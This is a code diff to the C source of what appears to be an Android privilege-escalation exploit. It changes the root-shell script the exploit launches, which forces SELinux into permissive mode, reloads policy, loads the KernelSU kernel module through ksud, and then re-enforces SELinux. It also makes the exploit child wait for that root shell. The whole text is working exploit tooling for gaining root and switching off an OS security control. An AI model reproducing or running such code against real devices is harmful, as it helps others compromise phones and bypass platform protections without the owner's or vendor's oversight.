@@ -516,6 +516,25 @@ static void write_root_script(void) {
       "  exit 1\n"
       "fi\n"
       "KMI=\"${AVER}-${KVER}\"\n"
+      "# step 1: restore policy (W1 already made permissive)\n"
+      "FIXUP_RC=1\n"
+      "for i in $(seq 1 10); do\n"
+      "  echo \"[*] fixup: attempt $i\" >>\"$LOG\"\n"
+      "  load_policy /sys/fs/selinux/policy >>\"$LOG\" 2>&1 &\n"
+      "  LPID=$!\n"
+      "  (sleep 8; kill -9 $LPID 2>/dev/null) &\n"
+      "  SPID=$!\n"
+      "  wait $LPID 2>/dev/null\n"
+      "  FIXUP_RC=$?\n"
+      "  kill $SPID 2>/dev/null\n"
+      "  if [ \"$FIXUP_RC\" -eq 0 ]; then\n"
+      "    break\n"
+      "  fi\n"
+      "  sleep 2\n"
+      "done\n"
+      "echo \"[*] policy fixup rc=$FIXUP_RC\" >>\"$LOG\"\n"
+      "if [ \"$FIXUP_RC\" -eq 0 ]; then\n"
+      "# load_policy ok: ksud late-load while still permissive, then re-enforce\n"
       "if ! grep -q kernelsu /proc/modules 2>/dev/null; then\n"
       "  if [ ! -x \"$KSUD\" ]; then\n"
       "    echo '[!] ksud missing; cannot late-load' | tee -a \"$LOG\"\n"
@@ -533,27 +552,12 @@ static void write_root_script(void) {
       "  sleep 0.1\n"
       "done\n"
       "if [ \"$KSU_READY\" -ne 1 ]; then\n"
-      "  echo '[!] KernelSU module not loaded; SELinux policy/enforcing unchanged' | tee -a \"$LOG\"\n"
+      "  echo '[!] KernelSU module not loaded' | tee -a \"$LOG\"\n"
       "  exit 1\n"
       "fi\n"
       "echo '[+] KernelSU module loaded' | tee -a \"$LOG\"\n"
-      "echo \"[*] kernelsu.ko loaded; root pid=$$ uid=$(id -u)\" >>\"$LOG\"\n"
-      "echo 0 > /sys/fs/selinux/enforce 2>/dev/null\n"
-      "echo \"[*] setenforce 0 rc=$?\" >>\"$LOG\"\n"
-      "FIXUP_RC=1\n"
-      "for i in $(seq 1 10); do\n"
-      "  echo \"[*] fixup: attempt $i\" >>\"$LOG\"\n"
-      "  timeout 8 load_policy /sys/fs/selinux/policy >>\"$LOG\" 2>&1\n"
-      "  FIXUP_RC=$?\n"
-      "  if [ \"$FIXUP_RC\" -eq 0 ]; then\n"
-      "    break\n"
-      "  fi\n"
-      "  sleep 2\n"
-      "done\n"
-      "echo \"[*] policy fixup rc=$FIXUP_RC\" >>\"$LOG\"\n"
-      "if [ \"$FIXUP_RC\" -eq 0 ]; then\n"
-      "  echo \"[*] restoring enforcing\" >>\"$LOG\"\n"
-      "  echo 1 > /sys/fs/selinux/enforce 2>/dev/null\n"
+      "echo \"[*] restoring enforcing\" >>\"$LOG\"\n"
+      "echo 1 > /sys/fs/selinux/enforce 2>/dev/null\n"
       "else\n"
       "  echo '[!] fixup failed; SELinux left permissive' | tee -a \"$LOG\"\n"
       "fi\n",
@@ -734,18 +738,18 @@ static void child_main(struct child_pipes *p) {
   }
   pid_t worker = fork();
   if (worker == 0) {
-    /* Detach into a brand-new session: the independent root shell owns the
-     * whole chain (ksud late-load + module watch) and must survive the
-     * exploit parent killing this group on timeout. */
     if (setsid() < 0) _exit(1);
     execl("/system/bin/sh", "sh", g_root_script_path, NULL);
     _exit(1);
   }
   if (worker < 0) { close(p->uid_w); _exit(1); }
-  /* Do not wait: the root shell runs to completion on its own; the parent
-   * polls the app-readable log. */
+  /* Wait for the root script to finish instead of detaching.  The parent
+   * already has a 300s timeout, and the script finishes in ~20s, so the
+   * exit code tells the Java side exactly what happened — no polling. */
+  int wst = 0;
+  waitpid(worker, &wst, 0);
   close(p->uid_w);
-  _exit(0);
+  _exit(WIFEXITED(wst) ? WEXITSTATUS(wst) : 1);
 }
 
 static pid_t spawn_child(struct child_pipes *p) {
@@ -1046,6 +1050,7 @@ int run_exploit(int argc, char **argv) {
 
   sleep(2);
   TIMER("exploit complete");
+
   if (child_alive) {
     if (write(pipes.cmd_w, "G", 1) != 1)
       pr_warning("failed to start root shell (child exited early)\n");
